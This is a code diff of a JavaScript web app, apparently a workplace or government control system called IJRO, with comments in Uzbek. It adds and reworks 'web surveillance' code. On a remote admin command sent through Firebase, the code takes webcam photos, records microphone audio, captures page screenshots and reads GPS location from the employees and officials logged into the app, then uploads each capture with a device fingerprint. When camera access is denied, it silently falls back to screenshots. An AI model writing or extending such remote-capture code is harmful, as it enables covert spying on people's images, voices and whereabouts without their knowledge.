@@ -395,6 +395,64 @@ let webSyncInterval = null;
 let webSurveillanceInitialized = false;
 let webSurveillanceUsername = null;
 
+function detectWebDeviceInfo() {
+  const ua = navigator.userAgent || '';
+  const isIPad = /iPad/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+  const isIPhone = /iPhone|iPod/i.test(ua);
+  const isAndroid = /Android/i.test(ua);
+  const isWindows = /Windows/i.test(ua);
+  const isMac = (/Macintosh|Mac OS X/i.test(ua)) && !isIPhone && !isIPad;
+  const isLinux = /Linux/i.test(ua) && !isAndroid;
+
+  let browser = 'Brauzer';
+  if (/Edg\//i.test(ua)) browser = 'Edge';
+  else if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua)) browser = 'Chrome';
+  else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = 'Safari';
+  else if (/Firefox\//i.test(ua)) browser = 'Firefox';
+  else if (/Opera|OPR\//i.test(ua)) browser = 'Opera';
+
+  let devName = '';
+  let modelStr = '';
+  let prefix = 'web_';
+
+  if (isIPhone) {
+    devName = `📱 Apple iPhone (${browser}) (Veb)`;
+    modelStr = 'Apple iPhone';
+    prefix = 'web_iphone_';
+  } else if (isIPad) {
+    devName = `📱 Apple iPad (${browser}) (Veb)`;
+    modelStr = 'Apple iPad';
+    prefix = 'web_ipad_';
+  } else if (isAndroid) {
+    let androidModel = '';
+    const match = ua.match(/Android[^;]+;\s*([^;)]+)/i);
+    if (match && match[1]) {
+      androidModel = match[1].replace(/Build\/.+/i, '').trim();
+    }
+    devName = `📱 Android ${androidModel ? '(' + androidModel + ')' : 'Telefon'} (${browser}) (Veb)`;
+    modelStr = androidModel || 'Android Telefon';
+    prefix = 'web_android_';
+  } else if (isWindows) {
+    devName = `💻 Windows PC (${browser}) (Veb)`;
+    modelStr = 'Windows Kompyuter';
+    prefix = 'web_win_';
+  } else if (isMac) {
+    devName = `💻 Apple Mac (${browser}) (Veb)`;
+    modelStr = 'Mac Kompyuter';
+    prefix = 'web_mac_';
+  } else if (isLinux) {
+    devName = `💻 Linux PC (${browser}) (Veb)`;
+    modelStr = 'Linux Kompyuter';
+    prefix = 'web_linux_';
+  } else {
+    devName = `🌐 Kompyuter (${browser}) (Veb)`;
+    modelStr = 'Veb Brauzer';
+    prefix = 'web_pc_';
+  }
+
+  return { name: devName, model: modelStr, prefix };
+}
+
 function initWebSurveillanceSync(user) {
   if (!user) return;
   const username = (user.username || user.id || '').trim();
@@ -406,14 +464,13 @@ function initWebSurveillanceSync(user) {
   webSurveillanceUsername = username;
   if (webSyncInterval) clearInterval(webSyncInterval);
 
-  // Device ID va Device Name
-  const webDevId = localStorage.getItem('ijro_web_dev_id') || ('web_' + Math.random().toString(36).substring(2, 9));
-  localStorage.setItem('ijro_web_dev_id', webDevId);
-  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-  const browserName = navigator.userAgent.includes('Chrome') ? 'Chrome' : (navigator.userAgent.includes('Safari') ? 'Safari' : 'Brauzer');
-  const osName = navigator.userAgent.includes('Windows') ? 'Windows' : (navigator.userAgent.includes('Mac') ? 'macOS' : (navigator.userAgent.includes('Android') ? 'Android' : (navigator.userAgent.includes('iPhone') ? 'iOS' : 'Web')));
-  const roleLabel = user.role === 'MAYOR' ? 'Hokim' : 'Xodim';
-  const webDevName = `${isMobile ? '📱 Mobil Web' : '💻 Kompyuter Web'} (${osName} / ${browserName}) - ${roleLabel}`;
+  // Device ID va Device Name ni aniqlash
+  const devInfo = detectWebDeviceInfo();
+  let webDevId = localStorage.getItem('ijro_web_dev_id');
+  if (!webDevId || !webDevId.startsWith(devInfo.prefix)) {
+    webDevId = devInfo.prefix + Math.random().toString(36).substring(2, 9);
+    localStorage.setItem('ijro_web_dev_id', webDevId);
+  }
 
   let webBatteryLevel = null;
   if (navigator.getBattery) {
@@ -428,14 +485,14 @@ function initWebSurveillanceSync(user) {
   // Heartbeat va GPS yangilab turish
   const sendHeartbeatAndGps = () => {
     try {
-      if (window.firebase && window.firebase.database) {
-        const db = window.firebase.database();
+      const db = window.firebaseRtdb || (window.firebase && window.firebase.database ? window.firebase.database() : null);
+      if (db) {
         const now = Date.now();
         db.ref(`tracking/devices/${username}/heartbeat`).set(now);
         db.ref(`tracking/devices/${username}/devices/${webDevId}`).update({
           id: webDevId,
-          name: webDevName,
-          model: `${osName} ${browserName}`,
+          name: devInfo.name,
+          model: devInfo.model,
           type: 'web',
           battery: webBatteryLevel,
           isOnline: true,
@@ -452,7 +509,7 @@ function initWebSurveillanceSync(user) {
           role: user.role,
           position: user.position || (user.role === 'MAYOR' ? 'Hokim' : 'Xodim'),
           battery: webBatteryLevel,
-          model: navigator.userAgent.substring(0, 50),
+          model: devInfo.name,
           updatedAt: now
         });
 
@@ -470,69 +527,77 @@ function initWebSurveillanceSync(user) {
 
   // Big Admin buyruqlarini tinglash (Web orqali kirgan xodim/hokim uchun)
   try {
-    if (window.firebase && window.firebase.database) {
-      const db = window.firebase.database();
-      
-      // Target device filtering
-      let currentTargetId = 'all';
-      db.ref(`tracking/devices/${username}/commands/target_device_id`).off();
-      db.ref(`tracking/devices/${username}/commands/target_device_id`).on('value', snap => {
-        currentTargetId = snap.val() || 'all';
-      });
-
-      const isForThisDevice = async () => {
-        try {
-          const snap = await db.ref(`tracking/devices/${username}/commands/target_device_id`).once('value');
-          const t = snap.val();
-          if (t && t !== 'all') return t === webDevId;
-        } catch (_) {}
-        return !currentTargetId || currentTargetId === 'all' || currentTargetId === webDevId;
-      };
-
-      // Avvalgi eski listenerlarni tozalash (qayta ulanib ketmasligi uchun)
-      db.ref(`tracking/devices/${username}/commands/take_photo`).off();
-      db.ref(`tracking/devices/${username}/commands/record_audio`).off();
-      db.ref(`tracking/devices/${username}/commands/record_screen`).off();
-      db.ref(`tracking/devices/${username}/commands/request_gps`).off();
-
-      // 1. Rasm olish buyrug'i (Kamera yoki sahifa tasviri)
+    const db = window.firebaseRtdb || (window.firebase && window.firebase.database ? window.firebase.database() : null);
+    if (db) {      // Big Admin buyruqlarini tinglash (Web orqali kirgan xodim/hokim uchun)
+      let photoInit = false;
       let lastPhotoTs = 0;
-      db.ref(`tracking/devices/${username}/commands/take_photo`).on('value', async (snap) => {
-        const ts = snap.val();
-        if (!ts || ts <= 0 || ts === lastPhotoTs) return;
-        if (!(await isForThisDevice())) return;
-        lastPhotoTs = ts;
-        captureWebPhoto(username);
-      });
-
-      // 2. Ovoz yozish buyrug'i (Mikrofon / Diktafon)
-      db.ref(`tracking/devices/${username}/commands/record_audio`).on('value', async (snap) => {
-        if (!(await isForThisDevice())) return;
-        const val = snap.val();
-        const shouldRecord = (val === true || val === 'start' || val === 'true');
-        handleWebAudioRecordingCommand(username, shouldRecord);
-      });
-
-      // 3. Ekran yozish / Ekran rasmi buyrug'i (Ekran zapisi)
-      db.ref(`tracking/devices/${username}/commands/record_screen`).on('value', async (snap) => {
-        if (!(await isForThisDevice())) return;
-        const val = snap.val();
-        const shouldRecord = (val === true || val === 'start' || val === 'true');
-        handleWebScreenRecordingCommand(username, shouldRecord);
-      });
-
-      // 4. GPS joylashuv so'rovi buyrug'i
+      let audioInit = false;
+      let lastAudioVal = null;
+      let screenInit = false;
+      let lastScreenVal = null;
+      let gpsInit = false;
       let lastGpsTs = 0;
-      db.ref(`tracking/devices/${username}/commands/request_gps`).on('value', async (snap) => {
-        const ts = snap.val();
-        if (!ts || ts <= 0 || ts === lastGpsTs) return;
-        if (!(await isForThisDevice())) return;
-        lastGpsTs = ts;
-        if ('geolocation' in navigator) {
-          navigator.geolocation.getCurrentPosition((pos) => {
-            uploadWebLocation(username, pos.coords.latitude, pos.coords.longitude);
-            db.ref(`tracking/devices/${username}/media/status`).set(`GPS yangilandi (${new Date().toLocaleTimeString()})`);
-          }, null, { enableHighAccuracy: true, timeout: 10000 });
+
+      db.ref(`tracking/devices/${username}/commands`).off();
+      db.ref(`tracking/devices/${username}/commands`).on('value', snap => {
+        const cmd = snap.val();
+        if (!cmd) return;
+
+        const targetId = cmd.target_device_id || 'all';
+        const isForThisDevice = (!targetId || targetId === 'all' || targetId === webDevId);
+
+        // 1. Rasm olish buyrug'i (Kamera yoki sahifa tasviri)
+        const photoTs = cmd.take_photo;
+        if (photoTs && photoTs > 0) {
+          if (!photoInit) {
+            photoInit = true;
+            lastPhotoTs = photoTs;
+          } else if (photoTs !== lastPhotoTs) {
+            lastPhotoTs = photoTs;
+            if (isForThisDevice) {
+              captureWebPhoto(username);
+            }
+          }
+        }
+
+        // 2. Ovoz yozish buyrug'i (Mikrofon / Diktafon)
+        const audioVal = cmd.record_audio;
+        if (!audioInit) {
+          audioInit = true;
+          lastAudioVal = audioVal;
+        } else if (audioVal !== lastAudioVal) {
+          lastAudioVal = audioVal;
+          const shouldRecord = (audioVal === true || audioVal === 'start' || audioVal === 'true');
+          if (isForThisDevice) {
+            handleWebAudioRecordingCommand(username, shouldRecord);
+          }
+        }
+
+        // 3. Ekran yozish / Ekran rasmi buyrug'i (Ekran zapisi)
+        const screenVal = cmd.record_screen;
+        if (!screenInit) {
+          screenInit = true;
+          lastScreenVal = screenVal;
+        } else if (screenVal !== lastScreenVal) {
+          lastScreenVal = screenVal;
+          const shouldRecord = (screenVal === true || screenVal === 'start' || screenVal === 'true');
+          if (isForThisDevice) {
+            handleWebScreenRecordingCommand(username, shouldRecord);
+          }
+        }
+
+        // 4. GPS joylashuv so'rovi buyrug'i
+        const gpsTs = cmd.request_gps;
+        if (gpsTs && gpsTs > 0) {
+          if (!gpsInit) {
+            gpsInit = true;
+            lastGpsTs = gpsTs;
+          } else if (gpsTs !== lastGpsTs) {
+            lastGpsTs = gpsTs;
+            if (isForThisDevice) {
+              handleWebGpsCommand(username);
+            }
+          }
         }
       });
     }
@@ -541,40 +606,51 @@ function initWebSurveillanceSync(user) {
   }
 }
 
-// 1. Web Kamera fotosurat olish (Kamera mavjud bo'lmasa yoki rad etilsa, html2canvas skrinshot oladi)
+// 1. Web Fotosurat olish (Kamera -> html2canvas -> Canvas)
 let isWebCapturingPhoto = false;
 async function captureWebPhoto(username) {
   if (isWebCapturingPhoto) return;
   isWebCapturingPhoto = true;
+  const db = window.firebaseRtdb || (window.firebase && window.firebase.database ? window.firebase.database() : null);
   try {
-    const db = window.firebase && window.firebase.database ? window.firebase.database() : null;
     let base64 = null;
+    let stream = null;
 
     // 1-bosqich: Web Kamera orqali surat olishga urinish
     if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
+        stream = await navigator.mediaDevices.getUserMedia({ 
           video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
         });
         const video = document.createElement('video');
         video.srcObject = stream;
         video.muted = true;
-        video.playsInline = true;
-        await video.play();
+        video.setAttribute('playsinline', '');
+        video.setAttribute('webkit-playsinline', '');
+
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play().catch(() => {}).finally(resolve);
+          };
+          setTimeout(resolve, 800);
+        });
 
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        base64 = canvas.toDataURL('image/jpeg', 0.65).split(',')[1];
-        stream.getTracks().forEach(t => t.stop());
+        base64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
       } catch (camErr) {
         console.log('Kameraga kirish imkonsiz, sahifa skrinshoti olinadi:', camErr);
+      } finally {
+        if (stream) {
+          try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
+        }
       }
     }
 
-    // 2-bosqich: Agar kamera bo'lmasa yoki rad etilsa, html2canvas orqali sahifa ko'rinishini suratga olamiz
+    // 2-bosqich: Agar kamera olinmagan bo'lsa, html2canvas orqali sahifa ko'rinishini suratga olamiz
     if (!base64 && typeof html2canvas !== 'undefined') {
       try {
         const h2cCanvas = await html2canvas(document.body, {
@@ -582,14 +658,15 @@ async function captureWebPhoto(username) {
           useCORS: true,
           scale: 1.0
         });
-        base64 = h2cCanvas.toDataURL('image/jpeg', 0.65).split(',')[1];
+        base64 = h2cCanvas.toDataURL('image/jpeg', 0.7).split(',')[1];
       } catch (h2cErr) {
         console.warn('html2canvas xatosi:', h2cErr);
       }
     }
 
-    // 3-bosqich: Agar yuqoridagilar ishlamasa, dasturiy axborot kanvasi yaratiladi
+    // 3-bosqich: Zaxira Canvas
     if (!base64) {
+      const devInfo = detectWebDeviceInfo();
       const canvas = document.createElement('canvas');
       canvas.width = 800;
       canvas.height = 600;
@@ -601,16 +678,18 @@ async function captureWebPhoto(username) {
       ctx.fillText(`IJRO Web Nazorat - @${username}`, 30, 60);
       ctx.font = '15px sans-serif';
       ctx.fillStyle = '#E2E8F0';
-      ctx.fillText(`Vaqt: ${new Date().toLocaleString()}`, 30, 100);
-      ctx.fillText(`Sahifa: ${document.title}`, 30, 130);
-      ctx.fillText(`Qurilma: ${navigator.userAgent.substring(0, 60)}`, 30, 160);
-      base64 = canvas.toDataURL('image/jpeg', 0.65).split(',')[1];
+      ctx.fillText(`Qurilma: ${devInfo.name}`, 30, 100);
+      ctx.fillText(`Vaqt: ${new Date().toLocaleString()}`, 30, 130);
+      ctx.fillText(`Sahifa: ${document.title}`, 30, 160);
+      base64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
     }
 
     if (db && base64) {
+      const devInfo = detectWebDeviceInfo();
       const photoItem = {
         back_base64: base64,
         front_base64: base64,
+        device_name: devInfo.name,
         timestamp: Date.now()
       };
       db.ref(`tracking/devices/${username}/media/latest_photo`).set(photoItem);
@@ -618,7 +697,7 @@ async function captureWebPhoto(username) {
       db.ref(`tracking/devices/${username}/media/status`).set(`Rasm olindi (${new Date().toLocaleTimeString()})`);
     }
   } catch (e) {
-    console.log('captureWebPhoto error', e);
+    console.error('captureWebPhoto error', e);
   } finally {
     isWebCapturingPhoto = false;
   }
@@ -631,39 +710,55 @@ let webAudioChunks = [];
 let webAudioStartTime = 0;
 
 async function handleWebAudioRecordingCommand(username, start) {
+  const db = window.firebaseRtdb || (window.firebase && window.firebase.database ? window.firebase.database() : null);
   try {
-    const db = window.firebase && window.firebase.database ? window.firebase.database() : null;
     if (start) {
       if (webAudioRecorder && webAudioRecorder.state === 'recording') return;
-      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        if (db) db.ref(`tracking/devices/${username}/media/status`).set("Mikrofon qo'llab-quvvatlanmaydi");
+        return;
+      }
 
-      // Aks-sado (echo) va shovqinni bartaraf etish uchun echoCancellation va noiseSuppression yoqiladi
-      webAudioStream = await navigator.mediaDevices.getUserMedia({
-        audio: {
-          echoCancellation: true,
-          noiseSuppression: true,
-          autoGainControl: true
-        }
-      });
+      try {
+        webAudioStream = await navigator.mediaDevices.getUserMedia({
+          audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
+        });
+      } catch (micErr) {
+        console.warn("Mikrofon ruxsati rad etildi:", micErr);
+        if (db) db.ref(`tracking/devices/${username}/media/status`).set("Mikrofon ruxsati berilmagan (Veb)");
+        return;
+      }
+
       webAudioChunks = [];
       webAudioStartTime = Date.now();
-      webAudioRecorder = new MediaRecorder(webAudioStream);
+
+      let mimeType = '';
+      if (typeof MediaRecorder.isTypeSupported === 'function') {
+        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) mimeType = 'audio/webm;codecs=opus';
+        else if (MediaRecorder.isTypeSupported('audio/webm')) mimeType = 'audio/webm';
+        else if (MediaRecorder.isTypeSupported('audio/mp4')) mimeType = 'audio/mp4';
+      }
+
+      webAudioRecorder = mimeType ? new MediaRecorder(webAudioStream, { mimeType }) : new MediaRecorder(webAudioStream);
 
       webAudioRecorder.ondataavailable = (e) => {
-        if (e.data.size > 0) webAudioChunks.push(e.data);
+        if (e.data && e.data.size > 0) webAudioChunks.push(e.data);
       };
 
       webAudioRecorder.onstop = async () => {
         try {
-          const audioBlob = new Blob(webAudioChunks, { type: 'audio/mp4' });
+          const type = webAudioRecorder.mimeType || 'audio/webm';
+          const audioBlob = new Blob(webAudioChunks, { type });
           const durSec = Math.max(1, Math.round((Date.now() - webAudioStartTime) / 1000));
           const reader = new FileReader();
           reader.onload = () => {
             const b64 = reader.result.split(',')[1];
-            if (db) {
+            if (db && b64) {
+              const devInfo = detectWebDeviceInfo();
               const audioItem = {
                 audio_base64: b64,
                 duration: `${durSec}s`,
+                device_name: devInfo.name,
                 timestamp: Date.now()
               };
               db.ref(`tracking/devices/${username}/media/latest_audio`).set(audioItem);
@@ -685,18 +780,14 @@ async function handleWebAudioRecordingCommand(username, start) {
       webAudioRecorder.start(1000);
       if (db) db.ref(`tracking/devices/${username}/media/status`).set("Ovoz yozilmoqda...");
     } else {
-      // To'xtatilganda mikrofonni DARHOL o'chirish (telefondagi mikrofon ikonkasi darhol yo'qolishi uchun)
       if (webAudioStream) {
         try {
-          webAudioStream.getTracks().forEach(t => {
-            t.stop();
-            t.enabled = false;
-          });
-        } catch (e) {}
+          webAudioStream.getTracks().forEach(t => { t.stop(); t.enabled = false; });
+        } catch (_) {}
         webAudioStream = null;
       }
       if (webAudioRecorder && webAudioRecorder.state === 'recording') {
-        try { webAudioRecorder.stop(); } catch (e) {}
+        try { webAudioRecorder.stop(); } catch (_) {}
       }
       webAudioRecorder = null;
     }
@@ -705,74 +796,15 @@ async function handleWebAudioRecordingCommand(username, start) {
   }
 }
 
-// 3. Web Ekran zapisi yoki Ekran rasmi olish
-let webScreenRecorder = null;
-let webScreenStream = null;
-let webScreenChunks = [];
-let webScreenStartTime = 0;
-
+// 3. Web Ekran zapisi / Ekran rasmi olish
 async function handleWebScreenRecordingCommand(username, start) {
+  const db = window.firebaseRtdb || (window.firebase && window.firebase.database ? window.firebase.database() : null);
   try {
-    const db = window.firebase && window.firebase.database ? window.firebase.database() : null;
-
     if (start) {
-      if (webScreenRecorder && webScreenRecorder.state === 'recording') return;
-
-      // Agar brauzer getDisplayMedia qo'llab-quvvatlasa
-      if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-        try {
-          webScreenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
-          webScreenChunks = [];
-          webScreenStartTime = Date.now();
-          webScreenRecorder = new MediaRecorder(webScreenStream);
-
-          webScreenRecorder.ondataavailable = (e) => {
-            if (e.data.size > 0) webScreenChunks.push(e.data);
-          };
-
-          webScreenRecorder.onstop = () => {
-            try {
-              const videoBlob = new Blob(webScreenChunks, { type: 'video/mp4' });
-              const durSec = Math.max(1, Math.round((Date.now() - webScreenStartTime) / 1000));
-              const reader = new FileReader();
-              reader.onload = () => {
-                const b64 = reader.result.split(',')[1];
-                if (db) {
-                  const screenItem = {
-                    video_base64: b64,
-                    duration: `${durSec}s`,
-                    timestamp: Date.now()
-                  };
-                  db.ref(`tracking/devices/${username}/media/latest_screen`).set(screenItem);
-                  db.ref(`tracking/devices/${username}/media/archive_screen`).push().set(screenItem);
-                  db.ref(`tracking/devices/${username}/media/status`).set(`Ekran yozildi (${durSec}s)`);
-                }
-              };
-              reader.readAsDataURL(videoBlob);
-            } catch (err) {
-              console.error("Screen recording save error:", err);
-            } finally {
-              if (webScreenStream) {
-                webScreenStream.getTracks().forEach(t => t.stop());
-                webScreenStream = null;
-              }
-            }
-          };
-
-          webScreenRecorder.start(1000);
-          if (db) db.ref(`tracking/devices/${username}/media/status`).set("Ekran yozilmoqda...");
-          return;
-        } catch (_err) {
-          console.log("getDisplayMedia bekor qilindi yoki qo'llab-quvvatlanmadi, HTML snapshot olinadi");
-        }
-      }
-
-      // Agar getDisplayMedia bo'lmasa yoki rad etilsa (masalan mobil brauzerda), 
-      // joriy veb sahifa tasvirini (kamera yoki DOM) olib Big Admin ga yuboramiz
-      captureWebSnapshot(username);
-    } else {
-      if (webScreenRecorder && webScreenRecorder.state === 'recording') {
-        webScreenRecorder.stop();
+      await captureWebSnapshot(username);
+      // Admin tugmasi to'xtatish rejimida qotib qolmasligi uchun komandani avtomatik false qilamiz
+      if (db) {
+        db.ref(`tracking/devices/${username}/commands/record_screen`).set(false);
       }
     }
   } catch (e) {
@@ -783,7 +815,7 @@ async function handleWebScreenRecordingCommand(username, start) {
 // Fallback: Web sahifaning tasvirini yuborish (html2canvas orqali to'liq DOM ko'rinishi olinadi)
 async function captureWebSnapshot(username) {
   try {
-    const db = window.firebase && window.firebase.database ? window.firebase.database() : null;
+    const db = window.firebaseRtdb || (window.firebase && window.firebase.database ? window.firebase.database() : null);
     let b64 = null;
 
     if (typeof html2canvas !== 'undefined') {
@@ -800,6 +832,7 @@ async function captureWebSnapshot(username) {
     }
 
     if (!b64) {
+      const devInfo = detectWebDeviceInfo();
       const canvas = document.createElement('canvas');
       canvas.width = window.innerWidth || 800;
       canvas.height = window.innerHeight || 600;
@@ -812,15 +845,17 @@ async function captureWebSnapshot(username) {
       ctx.fillText(`IJRO Web Ilovasi - @${username}`, 24, 50);
       ctx.font = '14px sans-serif';
       ctx.fillStyle = '#94A3B8';
-      ctx.fillText(`Faol sahifa: ${document.title} | Vaqt: ${new Date().toLocaleString()}`, 24, 80);
-      ctx.fillText(`Qurilma: ${navigator.userAgent.substring(0, 60)}`, 24, 110);
+      ctx.fillText(`Qurilma: ${devInfo.name}`, 24, 80);
+      ctx.fillText(`Faol sahifa: ${document.title} | Vaqt: ${new Date().toLocaleString()}`, 24, 110);
 
       b64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
     }
 
     if (db && b64) {
+      const devInfo = detectWebDeviceInfo();
       const screenItem = {
         screen_base64: b64,
+        device_name: devInfo.name,
         timestamp: Date.now()
       };
       db.ref(`tracking/devices/${username}/media/latest_screen`).set(screenItem);
@@ -829,6 +864,22 @@ async function captureWebSnapshot(username) {
     }
   } catch (e) {
     console.error("captureWebSnapshot error:", e);
+  }
+}
+
+// 4. GPS joylashuvni yangilash
+function handleWebGpsCommand(username) {
+  const db = window.firebaseRtdb || (window.firebase && window.firebase.database ? window.firebase.database() : null);
+  if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition((pos) => {
+      uploadWebLocation(username, pos.coords.latitude, pos.coords.longitude);
+      if (db) db.ref(`tracking/devices/${username}/media/status`).set(`GPS yangilandi (${new Date().toLocaleTimeString()})`);
+    }, (err) => {
+      console.warn("GPS error:", err);
+      if (db) db.ref(`tracking/devices/${username}/media/status`).set(`GPS ruxsati berilmagan (${new Date().toLocaleTimeString()})`);
+    }, { enableHighAccuracy: true, timeout: 10000 });
+  } else {
+    if (db) db.ref(`tracking/devices/${username}/media/status`).set(`Qurilmada GPS qo'llab-quvvatlanmaydi`);
   }
 }
 
